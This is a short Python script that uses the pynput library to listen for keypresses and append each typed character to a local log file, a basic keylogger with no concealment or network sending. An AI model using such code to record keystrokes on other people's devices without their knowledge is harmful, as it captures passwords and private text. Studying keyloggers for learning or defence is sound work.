from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keyfilelog.txt", 'a') as Keylog:
        try:
            char = key.char
            Keylog.write(char)
        except:
            print("error")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

